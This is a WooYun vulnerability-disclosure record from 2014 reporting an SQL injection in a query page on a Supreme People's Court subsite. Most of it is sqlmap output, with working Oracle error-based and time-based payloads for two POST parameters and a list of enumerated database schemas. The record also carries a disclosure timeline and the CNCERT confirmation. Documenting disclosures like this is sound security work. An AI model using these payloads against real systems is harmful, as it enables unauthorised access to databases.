{"id": 55578, "wybug_id": "wooyun-2014-060502", "wybug_title": "中华人民共和国最高人民法院分站SQL注入一枚", "wybug_corp": "中华人民共和国最高人民法院", "wybug_author": "Lonely", "wybug_date": "2014-05-13 12:47", "wybug_open_date": "2014-06-27 12:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-27：\t细节向公众公开  简要描述： 看某种爱情动作片看了几个小时 感觉好想射点什么、于是就射了。勿跨省，勿查询，勿追杀。偶只是一名小学生而已。 详细说明：  嗯。在人民法院看新闻 于是习惯性的加个 ' 测试下 还回 404于是换个频道 试试。。http://shixin.court.gov.cn/于是来到这个查询页面   随手 ’ 然后就 然后就射了，手工也能射的很美。   漏洞证明：  POST注入一枚。\n\nD:\\f782465af0ee45cd358d40008398b454\\sqlmaps>sqlmap.py -r 2.txt    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 05:44:37[05:44:37] [WARNING] using 'C:\\Documents and Settings\\90sec\\.sqlmap\\output' as the output directory[05:44:37] [INFO] parsing HTTP request from '2.txt'[05:44:37] [INFO] resuming back-end DBMS 'oracle'[05:44:37] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: pCardNum    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)    Payload: pName=1&pProvince=0&pCardNum=1'||(SELECT 'ZBHK' FROM DUAL WHERE 6521=6521 AND 9466=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(98)||CHR(104)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (9466=9466) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(104)||CHR(120)||CHR(98)||CHR(113)))||'    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: pName=1&pProvince=0&pCardNum=1'||(SELECT 'lAtU' FROM DUAL WHERE 7262=7262 AND 2436=DBMS_PIPE.RECEIVE_MESSAGE(CHR(89)||CHR(82)||CHR(105)||CHR(101),5))||'Place: POSTParameter: pName    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)    Payload: pName=1'||(SELECT 'xRQE' FROM DUAL WHERE 5207=5207 AND 1649=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(98)||CHR(104)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (1649=1649) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(104)||CHR(120)||CHR(98)||CHR(113)))||'&pProvince=0&pCardNum=1    Type: AND/OR time-based blind    Title: Oracle AND time-based blind    Payload: pName=1'||(SELECT 'ChHy' FROM DUAL WHERE 3772=3772 AND 6609=DBMS_PIPE.RECEIVE_MESSAGE(CHR(85)||CHR(97)||CHR(122)||CHR(83),5))||'&pProvince=0&pCardNum=1---there were multiple injection points, please select the one to use for following injections:[0] place: POST, parameter: pCardNum, type: Single quoted string (default)[1] place: POST, parameter: pName, type: Single quoted string[q] Quit> 0[05:44:39] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[05:45:36] [INFO] fetching database (schema) names[05:45:36] [INFO] the SQL query used returns 14 entries[05:45:36] [INFO] resumed: APEX_030200[05:45:36] [INFO] resumed: APPQOSSYS[05:45:36] [INFO] resumed: DBSNMP[05:45:36] [INFO] resumed: EXFSYS[05:45:36] [INFO] resumed: FLOWS_FILES[05:45:36] [INFO] resumed: MDSYS[05:45:36] [INFO] resumed: ORDDATA[05:45:36] [INFO] resumed: ORDSYS[05:45:36] [INFO] resumed: OUTLN[05:45:36] [INFO] resumed: SYS[05:45:36] [INFO] resumed: SYSTEM[05:45:36] [INFO] resumed: WMSYS[05:45:36] [INFO] resumed: XDB[05:45:36] [INFO] resumed: ZHIXINGavailable databases [14]:[*] APEX_030200[*] APPQOSSYS[*] DBSNMP[*] EXFSYS[*] FLOWS_FILES[*] MDSYS[*] ORDDATA[*] ORDSYS[*] OUTLN[*] SYS[*] SYSTEM[*] WMSYS[*] XDB[*] ZHIXING   修复方案：  过滤啊 过滤啊 除了说过滤也不知道怎么说了。   版权声明：转载请注明来源 Lonely@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-16 18:53 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向通报网站管理方最高人民法院处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}